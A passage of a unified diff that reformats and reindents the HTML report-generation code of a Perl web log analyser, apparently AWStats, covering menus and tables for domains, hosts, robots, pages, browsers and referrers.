 					print( $frame? "</td></tr>\n" : " &nbsp; " );
@@ -13555,13 +13679,14 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $ShowPagesStats =~ /E/i ) {
 					print( $frame
 						? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
-						: "" );
+						: ""
+					);
 					print "<a href=\""
 					  . (
-						  $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
-						  ? XMLEncode(
-									"$AWScript?${NewLinkParams}output=urlentry")
-						  : "$PROG$StaticLinks.urlentry.$StaticExt"
+						$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+						? XMLEncode(
+							"$AWScript?${NewLinkParams}output=urlentry")
+						: "$PROG$StaticLinks.urlentry.$StaticExt"
 					  )
 					  . "\"$NewLinkTarget>$Message[104]</a>\n";
 					print( $frame? "</td></tr>\n" : " &nbsp; " );
@@ -13569,12 +13694,15 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $ShowPagesStats =~ /X/i ) {
 					print( $frame
 						? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
-						: "" );
+						: ""
+					);
 					print "<a href=\""
-					  . ( $ENV{'GATEWAY_INTERFACE'}
-						   || !$StaticLinks
-						 ? XMLEncode("$AWScript?${NewLinkParams}output=urlexit")
-						 : "$PROG$StaticLinks.urlexit.$StaticExt" )
+					  . (
+						$ENV{'GATEWAY_INTERFACE'}
+						  || !$StaticLinks
+						? XMLEncode("$AWScript?${NewLinkParams}output=urlexit")
+						: "$PROG$StaticLinks.urlexit.$StaticExt"
+					  )
 					  . "\"$NewLinkTarget>$Message[116]</a>\n";
 					print( $frame? "</td></tr>\n" : " &nbsp; " );
 				}
@@ -13587,13 +13715,14 @@ if ( scalar keys %HTMLOutput ) {
 				if ($ShowOSStats) {
 					print( $frame
 						? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
-						: "" );
+						: ""
+					);
 					print "<a href=\""
 					  . (
-						  $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
-						  ? XMLEncode(
-									"$AWScript?${NewLinkParams}output=osdetail")
-						  : "$PROG$StaticLinks.osdetail.$StaticExt"
+						$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+						? XMLEncode(
+							"$AWScript?${NewLinkParams}output=osdetail")
+						: "$PROG$StaticLinks.osdetail.$StaticExt"
 					  )
 					  . "\"$NewLinkTarget>$Message[58]</a>\n";
 					print( $frame? "</td></tr>\n" : " &nbsp; " );
@@ -13601,13 +13730,14 @@ if ( scalar keys %HTMLOutput ) {
 				if ($ShowOSStats) {
 					print( $frame
 						? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
-						: "" );
+						: ""
+					);
 					print "<a href=\""
 					  . (
-						  $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
-						  ? XMLEncode(
-								   "$AWScript?${NewLinkParams}output=unknownos")
-						  : "$PROG$StaticLinks.unknownos.$StaticExt"
+						$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+						? XMLEncode(
+							"$AWScript?${NewLinkParams}output=unknownos")
+						: "$PROG$StaticLinks.unknownos.$StaticExt"
 					  )
 					  . "\"$NewLinkTarget>$Message[0]</a>\n";
 					print( $frame? "</td></tr>\n" : " &nbsp; " );
@@ -13621,13 +13751,14 @@ if ( scalar keys %HTMLOutput ) {
 				if ($ShowBrowsersStats) {
 					print( $frame
 						? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
-						: "" );
+						: ""
+					);
 					print "<a href=\""
 					  . (
-						  $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
-						  ? XMLEncode(
-							   "$AWScript?${NewLinkParams}output=browserdetail")
-						  : "$PROG$StaticLinks.browserdetail.$StaticExt"
+						$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+						? XMLEncode(
+							"$AWScript?${NewLinkParams}output=browserdetail")
+						: "$PROG$StaticLinks.browserdetail.$StaticExt"
 					  )
 					  . "\"$NewLinkTarget>$Message[58]</a>\n";
 					print( $frame? "</td></tr>\n" : " &nbsp; " );
@@ -13635,13 +13766,14 @@ if ( scalar keys %HTMLOutput ) {
 				if ($ShowBrowsersStats) {
 					print( $frame
 						? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
-						: "" );
+						: ""
+					);
 					print "<a href=\""
 					  . (
-						  $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
-						  ? XMLEncode(
-							  "$AWScript?${NewLinkParams}output=unknownbrowser")
-						  : "$PROG$StaticLinks.unknownbrowser.$StaticExt"
+						$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+						? XMLEncode(
+							"$AWScript?${NewLinkParams}output=unknownbrowser")
+						: "$PROG$StaticLinks.unknownbrowser.$StaticExt"
 					  )
 					  . "\"$NewLinkTarget>$Message[0]</a>\n";
 					print( $frame? "</td></tr>\n" : " &nbsp; " );
@@ -13656,38 +13788,38 @@ if ( scalar keys %HTMLOutput ) {
 
 				# Referers
 				%menu = (
-						'referer'      => $ShowOriginStats ? 1 : 0,
-						'refererse'    => $ShowOriginStats ? 2 : 0,
-						'refererpages' => $ShowOriginStats ? 3 : 0,
-						'keys' => ( $ShowKeyphrasesStats || $ShowKeywordsStats )
-						? 4
-						: 0,
-						'keyphrases' => $ShowKeyphrasesStats ? 5 : 0,
-						'keywords'   => $ShowKeywordsStats   ? 6 : 0
+					'referer'      => $ShowOriginStats ? 1 : 0,
+					'refererse'    => $ShowOriginStats ? 2 : 0,
+					'refererpages' => $ShowOriginStats ? 3 : 0,
+					'keys' => ( $ShowKeyphrasesStats || $ShowKeywordsStats )
+					? 4
+					: 0,
+					'keyphrases' => $ShowKeyphrasesStats ? 5 : 0,
+					'keywords'   => $ShowKeywordsStats   ? 6 : 0
 				);
 				%menulink = (
-							  'referer'      => 1,
-							  'refererse'    => 2,
-							  'refererpages' => 2,
-							  'keys'         => 1,
-							  'keyphrases'   => 2,
-							  'keywords'     => 2
+					'referer'      => 1,
+					'refererse'    => 2,
+					'refererpages' => 2,
+					'keys'         => 1,
+					'keyphrases'   => 2,
+					'keywords'     => 2
 				);
 				%menutext = (
-							  'referer'      => $Message[37],
-							  'refererse'    => $Message[126],
-							  'refererpages' => $Message[127],
-							  'keys'         => $Message[14],
-							  'keyphrases'   => $Message[120],
-							  'keywords'     => $Message[121]
+					'referer'      => $Message[37],
+					'refererse'    => $Message[126],
+					'refererpages' => $Message[127],
+					'keys'         => $Message[14],
+					'keyphrases'   => $Message[120],
+					'keywords'     => $Message[121]
 				);
 				ShowMenuCateg(
-							   'referers',     $Message[23],
-							   'menu7.png',    $frame,
-							   $targetpage,    $linkanchor,
-							   $NewLinkParams, $NewLinkTarget,
-							   \%menu,         \%menulink,
-							   \%menutext
+					'referers',     $Message[23],
+					'menu7.png',    $frame,
+					$targetpage,    $linkanchor,
+					$NewLinkParams, $NewLinkTarget,
+					\%menu,         \%menulink,
+					\%menutext
 				);
 
 				# Others
@@ -13700,17 +13832,17 @@ if ( scalar keys %HTMLOutput ) {
 					'clusters' => $ShowClusterStats ? 5 : 0
 				);
 				%menulink = (
-							  'filetypes' => 1,
-							  'misc'      => 1,
-							  'errors'    => 1,
-							  'clusters'  => 1
+					'filetypes' => 1,
+					'misc'      => 1,
+					'errors'    => 1,
+					'clusters'  => 1
 				);
 				%menutext = (
-					  'filetypes' => $Message[98],
-					  'misc'      => $Message[139],
-					  'errors'    =>
-						( $ShowSMTPErrorsStats ? $Message[147] : $Message[32] ),
-					  'clusters' => $Message[155]
+					'filetypes' => $Message[98],
+					'misc'      => $Message[139],
+					'errors'    =>
+					  ( $ShowSMTPErrorsStats ? $Message[147] : $Message[32] ),
+					'clusters' => $Message[155]
 				);
 				foreach ( keys %TrapInfosForHTTPErrorCodes ) {
 					$menu{"errors$_"}     = $ShowHTTPErrorsStats ? 4 : 0;
@@ -13718,19 +13850,19 @@ if ( scalar keys %HTMLOutput ) {
 					$menutext{"errors$_"} = $Message[31];
 				}
 				ShowMenuCateg(
-							   'others',       $Message[2],
-							   'menu8.png',    $frame,
-							   $targetpage,    $linkanchor,
-							   $NewLinkParams, $NewLinkTarget,
-							   \%menu,         \%menulink,
-							   \%menutext
+					'others',       $Message[2],
+					'menu8.png',    $frame,
+					$targetpage,    $linkanchor,
+					$NewLinkParams, $NewLinkTarget,
+					\%menu,         \%menulink,
+					\%menutext
 				);
 
 				# Extra/Marketing
 				%menu     = ();
 				%menulink = ();
 				%menutext = ();
-				my $i=1;
+				my $i = 1;
 				foreach ( 1 .. @ExtraName - 1 ) {
 					$menu{"extra$_"}        = $i++;
 					$menulink{"extra$_"}    = 1;
@@ -13740,12 +13872,12 @@ if ( scalar keys %HTMLOutput ) {
 					$menutext{"allextra$_"} = $Message[80];
 				}
 				ShowMenuCateg(
-							   'extra',        $Message[134],
-							   '',             $frame,
-							   $targetpage,    $linkanchor,
-							   $NewLinkParams, $NewLinkTarget,
-							   \%menu,         \%menulink,
-							   \%menutext
+					'extra',        $Message[134],
+					'',             $frame,
+					$targetpage,    $linkanchor,
+					$NewLinkParams, $NewLinkTarget,
+					\%menu,         \%menulink,
+					\%menutext
 				);
 				print "</table>\n";
 			}
@@ -13769,19 +13901,18 @@ if ( scalar keys %HTMLOutput ) {
 			$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
 			$NewLinkParams =~ s/^&amp;//;
 			$NewLinkParams =~ s/&amp;$//;
-			if (    !$DetailedReportsOnNewWindows
-				 || $FrameName eq 'mainright'
-				 || $QueryString =~ /buildpdf/i )
+			if (   !$DetailedReportsOnNewWindows
+				|| $FrameName eq 'mainright'
+				|| $QueryString =~ /buildpdf/i )
 			{
 				print "<tr><td class=\"aws\"><a href=\""
 				  . (
-					  $ENV{'GATEWAY_INTERFACE'}
-						|| !$StaticLinks
-					  ? XMLEncode(
-							 "$AWScript"
-							   . ( ${NewLinkParams} ? "?${NewLinkParams}" : "" )
-						)
-					  : "$PROG$StaticLinks.$StaticExt"
+					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+					? XMLEncode(
+						"$AWScript"
+						  . ( ${NewLinkParams} ? "?${NewLinkParams}" : "" )
+					  )
+					: "$PROG$StaticLinks.$StaticExt"
 				  )
 				  . "\">$Message[76]</a></td></tr>\n";
 			}
@@ -13818,7 +13949,7 @@ if ( scalar keys %HTMLOutput ) {
 		if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
 		if ($keyqualified) {
 			if ( $FirstTime{$key}
-				 && ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
+				&& ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
 			{
 				$FirstTime = $FirstTime{$key};
 			}
@@ -13949,7 +14080,7 @@ if ( scalar keys %HTMLOutput ) {
 		  . "0101";    # Set day cursor to 1st day of the required year
 	}
 	if ( ( $MonthRequired ne $nowmonth && $MonthRequired ne 'all' )
-		 || $YearRequired ne $nowyear )
+		|| $YearRequired ne $nowyear )
 	{
 		if ( $MonthRequired eq 'all' ) {
 			$firstdaytocountaverage =
@@ -14030,12 +14161,14 @@ if ( scalar keys %HTMLOutput ) {
 			&tab_head( "$title", 19, 0, 'domains' );
 			print
 "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th colspan=\"2\">$Message[17]</th>";
-    		if ( $ShowDomainsStats =~ /U/i ) { 
-    			print "<th bgcolor=\"#$color_u\" width=\"80\">$Message[11]</th>";
-    		}
-	 		if ( $ShowDomainsStats =~ /V/i ) { 
-	 			print "<th bgcolor=\"#$color_v\" width=\"80\">$Message[10]</th>"; 
-	 		}
+			if ( $ShowDomainsStats =~ /U/i ) {
+				print
+				  "<th bgcolor=\"#$color_u\" width=\"80\">$Message[11]</th>";
+			}
+			if ( $ShowDomainsStats =~ /V/i ) {
+				print
+				  "<th bgcolor=\"#$color_v\" width=\"80\">$Message[10]</th>";
+			}
 			if ( $ShowDomainsStats =~ /P/i ) {
 				print
 				  "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th>";
@@ -14061,7 +14194,7 @@ if ( scalar keys %HTMLOutput ) {
 			}
 			my $count = 0;
 			&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_domener_h,
-						   \%_domener_p );
+				\%_domener_p );
 			foreach my $key (@keylist) {
 				my ( $_domener_u, $_domener_v );
 				my $bredde_p = 0;
@@ -14098,10 +14231,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE
 				if ( $ShowDomainsStats =~ /U/i ) {
-					$_domener_u =
-					  (   $_domener_p{$key}
+					$_domener_u = (
+						  $_domener_p{$key}
 						? $_domener_p{$key} / $TotalPages
-						: 0 );
+						: 0
+					);
 					$_domener_u += ( $_domener_h{$key} / $TotalHits );
 					$_domener_u =
 					  sprintf( "%.0f", ( $_domener_u * $TotalUnique ) / 2 );
@@ -14110,10 +14244,11 @@ if ( scalar keys %HTMLOutput ) {
 					  . ")</td>";
 				}
 				if ( $ShowDomainsStats =~ /V/i ) {
-					$_domener_v =
-					  (   $_domener_p{$key}
+					$_domener_v = (
+						  $_domener_p{$key}
 						? $_domener_p{$key} / $TotalPages
-						: 0 );
+						: 0
+					);
 					$_domener_v += ( $_domener_h{$key} / $TotalHits );
 					$_domener_v =
 					  sprintf( "%.0f", ( $_domener_v * $TotalVisits ) / 2 );
@@ -14147,7 +14282,7 @@ if ( scalar keys %HTMLOutput ) {
 					print
 "<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"5\""
 					  . AltTitle(
-						  "$Message[75]: " . Format_Bytes( $_domener_k{$key} ) )
+						"$Message[75]: " . Format_Bytes( $_domener_k{$key} ) )
 					  . " />";
 				}
 				print "</td>";
@@ -14164,11 +14299,11 @@ if ( scalar keys %HTMLOutput ) {
 			$rest_p = $TotalPages - $total_p;
 			$rest_h = $TotalHits - $total_h;
 			$rest_k = $TotalBytes - $total_k;
-			if (    $rest_u > 0
-				 || $rest_v > 0
-				 || $rest_p > 0
-				 || $rest_h > 0
-				 || $rest_k > 0 )
+			if (   $rest_u > 0
+				|| $rest_v > 0
+				|| $rest_p > 0
+				|| $rest_h > 0
+				|| $rest_k > 0 )
 			{    # All other domains (known or not)
 				print
 "<tr><td width=\"$WIDTHCOLICON\">&nbsp;</td><td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
@@ -14190,7 +14325,7 @@ if ( scalar keys %HTMLOutput ) {
 
 			# Show filter form
 			&ShowFormFilter( "hostfilter", $FilterIn{'host'},
-							 $FilterEx{'host'} );
+				$FilterEx{'host'} );
 
 			# Show hosts list
 			my $title = '';
@@ -14251,11 +14386,11 @@ if ( scalar keys %HTMLOutput ) {
 			my $count = 0;
 			if ( $HTMLOutput{'allhosts'} ) {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
-							   \%_host_p );
+					\%_host_p );
 			}
 			if ( $HTMLOutput{'lasthosts'} ) {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
-							   \%_host_l );
+					\%_host_l );
 			}
 			foreach my $key (@keylist) {
 				my $host = CleanXSS($key);
@@ -14276,9 +14411,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowHostsStats =~ /L/i ) {
 					print "<td>"
-					  . ( $_host_l{$key}
-						  ? Format_Date( $_host_l{$key}, 1 )
-						  : '-' )
+					  . (
+						$_host_l{$key}
+						? Format_Date( $_host_l{$key}, 1 )
+						: '-'
+					  )
 					  . "</td>";
 				}
 				print "</tr>\n";
@@ -14340,7 +14477,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_p = $total_h = $total_k = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
-						   \%_host_p );
+				\%_host_p );
 			foreach my $key (@keylist) {
 				my $host = CleanXSS($key);
 				print "<tr><td class=\"aws\">$host</td>";
@@ -14358,9 +14495,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowHostsStats =~ /L/i ) {
 					print "<td>"
-					  . ( $_host_l{$key}
-						  ? Format_Date( $_host_l{$key}, 1 )
-						  : '-' )
+					  . (
+						$_host_l{$key}
+						? Format_Date( $_host_l{$key}, 1 )
+						: '-'
+					  )
 					  . "</td>";
 				}
 				print "</tr>\n";
@@ -14433,11 +14572,11 @@ if ( scalar keys %HTMLOutput ) {
 			my $count = 0;
 			if ( $HTMLOutput{'alllogins'} ) {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'},
-							   \%_login_h, \%_login_p );
+					\%_login_h, \%_login_p );
 			}
 			if ( $HTMLOutput{'lastlogins'} ) {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'},
-							   \%_login_h, \%_login_l );
+					\%_login_h, \%_login_l );
 			}
 			foreach my $key (@keylist) {
 				print "<tr><td class=\"aws\">$key</td>";
@@ -14455,9 +14594,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowAuthenticatedUsers =~ /L/i ) {
 					print "<td>"
-					  . ( $_login_l{$key}
-						  ? Format_Date( $_login_l{$key}, 1 )
-						  : '-' )
+					  . (
+						$_login_l{$key}
+						? Format_Date( $_login_l{$key}, 1 )
+						: '-'
+					  )
 					  . "</td>";
 				}
 				print "</tr>\n";
@@ -14522,11 +14663,11 @@ if ( scalar keys %HTMLOutput ) {
 			my $count = 0;
 			if ( $HTMLOutput{'allrobots'} ) {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},
-							   \%_robot_h, \%_robot_h );
+					\%_robot_h, \%_robot_h );
 			}
 			if ( $HTMLOutput{'lastrobots'} ) {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},
-							   \%_robot_h, \%_robot_l );
+					\%_robot_h, \%_robot_l );
 			}
 			foreach my $key (@keylist) {
 				print "<tr><td class=\"aws\">"
@@ -14542,9 +14683,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowRobotsStats =~ /L/i ) {
 					print "<td>"
-					  . ( $_robot_l{$key}
-						  ? Format_Date( $_robot_l{$key}, 1 )
-						  : '-' )
+					  . (
+						$_robot_l{$key}
+						? Format_Date( $_robot_l{$key}, 1 )
+						: '-'
+					  )
 					  . "</td>";
 				}
 				print "</tr>\n";
@@ -14591,9 +14734,9 @@ if ( scalar keys %HTMLOutput ) {
 				"* $Message[156]" . ( $TotalRRobots ? " $Message[157]" : "" ) );
 			&html_end(1);
 		}
-		if (    $HTMLOutput{'urldetail'}
-			 || $HTMLOutput{'urlentry'}
-			 || $HTMLOutput{'urlexit'} )
+		if (   $HTMLOutput{'urldetail'}
+			|| $HTMLOutput{'urlentry'}
+			|| $HTMLOutput{'urlexit'} )
 		{
 
 			# Call to plugins' function ShowPagesFilter
@@ -14679,15 +14822,15 @@ if ( scalar keys %HTMLOutput ) {
 			my $count = 0;
 			if ( $HTMLOutput{'urlentry'} ) {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_e,
-							   \%_url_e );
+					\%_url_e );
 			}
 			elsif ( $HTMLOutput{'urlexit'} ) {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_x,
-							   \%_url_x );
+					\%_url_x );
 			}
 			else {
 				&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_p,
-							   \%_url_p );
+					\%_url_p );
 			}
 			$max_p = 1;
 			$max_k = 1;
@@ -14723,8 +14866,8 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $max_k > 0 ) {
 					$bredde_k =
 					  int( $BarWidth *
-						   ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
-						   $max_k ) + 1;
+						  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
+						  $max_k ) + 1;
 				}
 				if ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }
 				if ( $ShowPagesStats =~ /P/i ) {
@@ -14733,11 +14876,11 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $ShowPagesStats =~ /B/i ) {
 					print "<td>"
 					  . (
-						  $_url_k{$key}
-						  ? Format_Bytes(
-										  $_url_k{$key} / ( $_url_p{$key} || 1 )
-							)
-						  : "&nbsp;"
+						$_url_k{$key}
+						? Format_Bytes(
+							$_url_k{$key} / ( $_url_p{$key} || 1 )
+						  )
+						: "&nbsp;"
 					  )
 					  . "</td>";
 				}
@@ -14752,7 +14895,7 @@ if ( scalar keys %HTMLOutput ) {
 
 				# Call to plugins' function ShowPagesAddField
 				foreach my $pluginname (
-								 keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
+					keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
 				{
 
 				  #    				my $function="ShowPagesAddField_$pluginname('$key')";
@@ -14804,9 +14947,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowPagesStats =~ /B/i ) {
 					print "<td>"
-					  . ( $rest_k
-						  ? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
-						  : "&nbsp;" )
+					  . (
+						$rest_k
+						? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
+						: "&nbsp;"
+					  )
 					  . "</td>";
 				}
 				if ( $ShowPagesStats =~ /E/i ) {
@@ -14818,7 +14963,7 @@ if ( scalar keys %HTMLOutput ) {
 
 				# Call to plugins' function ShowPagesAddField
 				foreach my $pluginname (
-								 keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
+					keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
 				{
 
 					#    				my $function="ShowPagesAddField_$pluginname('')";
@@ -14841,7 +14986,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_l = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_unknownreferer_l,
-						   \%_unknownreferer_l );
+				\%_unknownreferer_l );
 			foreach my $key (@keylist) {
 				my $useragent = XMLEncode( CleanXSS($key) );
 				print "<tr><td class=\"aws\">$useragent</td>";
@@ -14871,7 +15016,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_l = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_unknownrefererbrowser_l,
-						   \%_unknownrefererbrowser_l );
+				\%_unknownrefererbrowser_l );
 			foreach my $key (@keylist) {
 				my $useragent = XMLEncode( CleanXSS($key) );
 				print "<tr><td class=\"aws\">$useragent</td><td>"
@@ -14905,7 +15050,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_h = 0;
 			my $count = 0;
 			&BuildKeyList( MinimumButNoZero( scalar keys %_os_h, 500 ),
-						   1, \%_os_h, \%_os_h );
+				1, \%_os_h, \%_os_h );
 			my %keysinkeylist = ();
 			$max_h = 1;
 
@@ -15067,7 +15212,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_h = 0;
 			my $count = 0;
 			&BuildKeyList( MinimumButNoZero( scalar keys %_browser_h, 500 ),
-						   1, \%_browser_h, \%_browser_h );
+				1, \%_browser_h, \%_browser_h );
 			my %keysinkeylist = ();
 			$max_h = 1;
 
@@ -15089,11 +15234,9 @@ if ( scalar keys %HTMLOutput ) {
 			}
 
 			# Write records grouped in a browser family
-			foreach my $family (
-				sort {
-					$BrowsersFamily{$a} <=> $BrowsersFamily{$b}
-				} keys %BrowsersFamily
-			  )
+			foreach
+			  my $family ( sort { $BrowsersFamily{$a} <=> $BrowsersFamily{$b} }
+				keys %BrowsersFamily )
 			{
 				my $p = '&nbsp;';
 				if ($total_h) {
@@ -15101,9 +15244,9 @@ if ( scalar keys %HTMLOutput ) {
 					$p = "$p %";
 				}
 				my $familyheadershown = 0;
+
 				#foreach my $key ( reverse sort keys %_browser_h ) {
-    			foreach my $key (reverse sort SortBrowsers keys %_browser_h) 
-    			{
+				foreach my $key ( reverse sort SortBrowsers keys %_browser_h ) {
 					if ( $key =~ /^$family(.*)/i ) {
 						if ( !$familyheadershown ) {
 							print
@@ -15134,15 +15277,17 @@ if ( scalar keys %HTMLOutput ) {
 						  . ucfirst($family) . " "
 						  . ( $ver ? "$ver" : "?" ) . "</td>";
 						print "<td>"
-						  . ( $BrowsersHereAreGrabbers{$family}
-							  ? "<b>$Message[112]</b>"
-							  : "$Message[113]" )
+						  . (
+							$BrowsersHereAreGrabbers{$family}
+							? "<b>$Message[112]</b>"
+							: "$Message[113]"
+						  )
 						  . "</td>";
 						my $bredde_h = 0;
 						if ( $max_h > 0 ) {
 							$bredde_h =
 							  int( $BarWidth * ( $_browser_h{$key} || 0 ) /
-								   $max_h ) + 1;
+								  $max_h ) + 1;
 						}
 						if ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {
 							$bredde_h = 2;
@@ -15207,9 +15352,11 @@ if ( scalar keys %HTMLOutput ) {
 					  . "><img src=\"$DirIcons\/browser\/$nameicon.png\""
 					  . AltTitle("")
 					  . " /></td><td class=\"aws\">$libbrowser</td><td>"
-					  . ( $BrowsersHereAreGrabbers{$key}
-						  ? "<b>$Message[112]</b>"
-						  : "$Message[113]" )
+					  . (
+						$BrowsersHereAreGrabbers{$key}
+						? "<b>$Message[112]</b>"
+						: "$Message[113]"
+					  )
 					  . "</td>";
 				}
 				my $bredde_h = 0;
@@ -15249,14 +15396,14 @@ if ( scalar keys %HTMLOutput ) {
 			$total_s = 0;
 			my $count = 0;
 			&BuildKeyList(
-						   $MaxRowsInHTMLOutput,
-						   $MinHit{'Refer'},
-						   \%_se_referrals_h,
-						   (
-							  ( scalar keys %_se_referrals_p )
-							  ? \%_se_referrals_p
-							  : \%_se_referrals_h
-						   )
+				$MaxRowsInHTMLOutput,
+				$MinHit{'Refer'},
+				\%_se_referrals_h,
+				(
+					( scalar keys %_se_referrals_p )
+					? \%_se_referrals_p
+					: \%_se_referrals_h
+				)
 			);    # before 5.4 only hits were recorded
 
 			foreach my $key (@keylist) {
@@ -15266,12 +15413,12 @@ if ( scalar keys %HTMLOutput ) {
 				if ($TotalSearchEnginesPages) {
 					$p_p =
 					  int( $_se_referrals_p{$key} / $TotalSearchEnginesPages *
-						   1000 ) / 10;
+						  1000 ) / 10;
 				}
 				if ($TotalSearchEnginesHits) {
 					$p_h =
 					  int( $_se_referrals_h{$key} / $TotalSearchEnginesHits *
-						   1000 ) / 10;
+						  1000 ) / 10;
 				}
 				print "<tr><td class=\"aws\">$newreferer</td>";
 				print "<td>"
@@ -15321,9 +15468,9 @@ if ( scalar keys %HTMLOutput ) {
 
 			# Show filter form
 			&ShowFormFilter(
-							 "refererpagesfilter",
-							 $FilterIn{'refererpages'},
-							 $FilterEx{'refererpages'}
+				"refererpagesfilter",
+				$FilterIn{'refererpages'},
+				$FilterEx{'refererpages'}
 			);
 			my $title = "$Message[41]";
 			my $cpt   = 0;
@@ -15361,14 +15508,14 @@ if ( scalar keys %HTMLOutput ) {
 			$total_s = 0;
 			my $count = 0;
 			&BuildKeyList(
-						   $MaxRowsInHTMLOutput,
-						   $MinHit{'Refer'},
-						   \%_pagesrefs_h,
-						   (
-							  ( scalar keys %_pagesrefs_p )
-							  ? \%_pagesrefs_p
-							  : \%_pagesrefs_h
-						   )
+				$MaxRowsInHTMLOutput,
+				$MinHit{'Refer'},
+				\%_pagesrefs_h,
+				(
+					( scalar keys %_pagesrefs_p )
+					? \%_pagesrefs_p
+					: \%_pagesrefs_h
+				)
 			);
 
 			foreach my $key (@keylist) {
@@ -15441,18 +15588,19 @@ if ( scalar keys %HTMLOutput ) {
 			  . "><th>$TotalDifferentKeyphrases $Message[103]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[14]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[15]</th></tr>\n";
 			$total_s = 0;
 			my $count = 0;
-			&BuildKeyList(          $MaxRowsInHTMLOutput, $MinHit{'Keyphrase'},
-						   \%_keyphrases,        \%_keyphrases );
-			foreach my $key (@keylist) 
-			{
+			&BuildKeyList(
+				$MaxRowsInHTMLOutput, $MinHit{'Keyphrase'},
+				\%_keyphrases,        \%_keyphrases
+			);
+			foreach my $key (@keylist) {
 				my $mot;
 
-				# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
+	  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
 				if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
 					$mot = CleanXSS(
-									 DecodeKey_decodeutfkeys(
-												 $key, $PageCode || 'iso-8859-1'
-									 )
+						DecodeKey_decodeutfkeys(
+							$key, $PageCode || 'iso-8859-1'
+						)
 					);
 				}
 				else { $mot = CleanXSS( DecodeEncodedString($key) ); }
@@ -15492,16 +15640,16 @@ if ( scalar keys %HTMLOutput ) {
 			$total_s = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Keyword'},
-						   \%_keywords, \%_keywords );
+				\%_keywords, \%_keywords );
 			foreach my $key (@keylist) {
 				my $mot;
 
-				# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
+	  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
